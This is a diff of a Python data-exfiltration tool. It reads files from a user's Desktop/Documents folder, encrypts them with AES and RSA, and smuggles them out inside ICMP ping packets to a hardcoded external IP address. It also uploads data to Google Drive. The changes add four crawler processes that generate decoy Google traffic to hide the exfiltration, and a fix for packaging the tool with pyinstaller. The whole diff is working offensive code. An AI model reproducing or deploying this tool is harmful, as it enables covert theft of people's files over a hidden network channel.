@@ -4,6 +4,8 @@ import time
 import re
 import random
 import requests
+import os
+import multiprocessing
 from multiprocessing import Process
 from socket import htons
 from time import sleep
@@ -14,15 +16,14 @@ from Crypto.Cipher import AES
 from pydrive.auth import GoogleAuth
 from pydrive.drive import GoogleDrive
 
-import os
-
+#Configuration for crawler settings
 class Configuration:
   Min_URL_Depth = 5
   Max_URL_Depth = 10
   MAX_WAIT = 10
   MIN_WAIT = 3
 
-  #Google websites to talk to
+  #Google websites to talk to and go down recursively
   ROOT_URLS = [
     "https://google.com",
     "https://sites.google.com",
@@ -33,38 +34,38 @@ class Configuration:
 
   USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ' \
     'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'
-  
-class CrawlPage:
 
+#Class to crawl page and generate Google traffic
+class CrawlPage:
   def request(url):
     print("Requesting page")
     headers = {'user-agent':Configuration.USER_AGENT}
-
     try:
       r = requests.get(url= url, headers=headers, timeout=5)
     except:
       return False
-    
-    page_size = len(r.content)
 
     status = r.status_code
+
     if (status!=200):
-      print("Bad")
-      if (status == 429):
-        sleep(10)
+      print("Bad request")
+      #429 means too many requests at once. Need to sleep
+      if (status == 429): 
+        sleep(5)
     else:
       print("Good request")
 
     return r
   
+  #Function pattern to get links on a page
   def get_links(page):
     pattern = r"(?:href\=\")(https?:\/\/[^\"]+)(?:\")"
     links = re.findall(pattern, str(page.content))
 
     return links
 
+  #Main function to generate traffic and recursively browse each website
   def recursive_browse(url,depth):
-    # print("Recursively browsing [{}] ~~~ [depth = {}]".format(url, depth))
     if not depth:
       CrawlPage.request(url)
       return
@@ -77,24 +78,23 @@ class CrawlPage:
       except:
         print("Stopping, no links found")
         return
-      #time.sleep(1) #To prevent from sending too much request at once
 
       try:
         CrawlPage.recursive_browse(random.choice(valid_links), depth-1)
       except:
         print("Jump out back to original loop")
         return
-    
+
 class Cipher:
   def encrypt(content):
     #Encrypting using AES first
     aeskey = Random.new().read(24)
-    iv = Random.new().read(AES.block_size)    #To ensure that same value encrypted multiples times with same key will result in different value
-    cipher = AES.new(aeskey,AES.MODE_CFB,iv)  #Cipher Feedback mode, allows block encryptor to be used as a stream cipher
+    iv = Random.new().read(AES.block_size)            #To ensure that same value encrypted multiples times with same key will result in different value
+    cipher = AES.new(aeskey,AES.MODE_CFB,iv)          #Cipher Feedback mode, allows block encryptor to be used as a stream cipher
     encryptedcontent = cipher.encrypt(content)        #Passing data packet to be encrypted
 
     #RSA Encryption portion 
-    public_key = RSA.importKey(open("..\..\RSAkeys\public.pem").read())  #Retrieve our public key
+    public_key = RSA.importKey(open("RSAkeys\public.pem").read())  #Retrieve our public key
     rsa = PKCS1_OAEP.new(public_key)
     cipherkey = rsa.encrypt(aeskey)                             #Encrypting the randomly generated 24 AES key
     
@@ -126,7 +126,7 @@ class Checksum:
 #This class constructs the payload
 class Payload:
     HEADER_CONTENT= "bbHHh" # 6262484868
-    ICMP_ECHO_REQUEST = 8
+    ICMP_ECHO_REQUEST = 8   # Type 8 for echo request
 
     #Building the payload here
     def __init__(self, header: bytes, data: bytes, id: int):
@@ -143,7 +143,7 @@ class Payload:
     def build_payload(self, *data: bytes) -> bytes:
         for index, string in enumerate(data):
           self.data += string
-        self.data, cipherkey , iv = Cipher.encrypt(self.data) #Encrypt using AES first then returning AES encrypted and RSA encrypted
+        self.data, cipherkey , iv = Cipher.encrypt(self.data) #Encrypt using AES first then returning AES encrypted, RSA encrypted key and IV
         self.data += iv
         self.data += cipherkey
         #Appending Data at the back of the data portion
@@ -173,8 +173,8 @@ class Pinger:
         result.append(file_path)
   
     return result
-
-
+  
+  #Function to build and send ping packets
   def sendPing(self, databytes):
       header = Payload.build_basic_imcp_header(self.ID)
       data = Payload.build_basic_imcp_data()
@@ -185,11 +185,8 @@ class Pinger:
         databytes
       )
       self.tunnel.sendto(packet, (self.ipAddress,1))
-    
-  def zip_file(self,data):
-    out = io.BytesIO()
-
-
+  
+  #Preparing the data and content to be hidden inside a ping packet
   def prepareping(self) -> None:
     #Find files in a folder on desktop
     desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop/Documents') 
@@ -210,9 +207,9 @@ class Pinger:
 
         bytes_read = filename 
         randnum = random.randrange(1000,Pinger.MAX_SIZE)
-        bytes_read += f.read(randnum-len(filename)-128-16-8) #This ensures we append filename at the FIRST icmp packet
+        bytes_read += f.read(randnum-len(filename)-128-16-8)          #This ensures we append filename at the FIRST icmp packet
         filebyteslength -= (randnum-len(filename)-128-16-8)           #First packet deduction
-        Pinger.sendPing(self, bytes_read)                             #First packet sending of ping
+        Pinger.sendPing(self, bytes_read)                             #First packet sending of ping contaiing FILE NAME
 
         #sleep(random.randint(1,3))  #Change accordingly to decrease intensity
         while filebyteslength >0:
@@ -234,7 +231,7 @@ class Pinger:
           Pinger.sendPing(self, bytes_read)       #Subsequent packets sending of ping
 
 def uploadToDrive():
-    gauth = GoogleAuth(settings_file='../../Auth/settings.yaml')           
+    gauth = GoogleAuth(settings_file='..\..\Auth\settings.yaml')           
     drive = GoogleDrive(gauth)  
     # Ensure that credentials.json and settings.yaml is in the same folder as this python file
     
@@ -265,7 +262,7 @@ def CrawlLooper():
   try: 
     while True:
       url = random.choice(Configuration.ROOT_URLS)
-      print(url)
+      # print(url)
       CrawlPage.recursive_browse(url,Configuration.Max_URL_Depth)
   except KeyboardInterrupt:
     print("Out")
@@ -274,9 +271,17 @@ def CrawlLooper():
 #Main method. Hardcoded IP address and Google drive upload, replace with whatever you want.
 if __name__ == "__main__":
 
-  # Process(target=CrawlLooper).start()
-  ip = "128.199.105.125"
-  ipv6 = "2400:6180:0:d0::12c7:f001" #IPv6 addreess
+  #To fix pyinstaller with threading
+  multiprocessing.freeze_support()
+  
+  #Create 4 processes of crawling the root directories.
+  Process(target=CrawlLooper).start()
+  Process(target=CrawlLooper).start()
+  Process(target=CrawlLooper).start()
+  Process(target=CrawlLooper).start()
+
+  #Start of ICMP encrypted payload tool here and Google Upload. 
+  #Values are hardcoded, so change if you wish to
   pinger = Pinger("128.199.105.125") 
   pinger.prepareping()
   uploadToDrive()
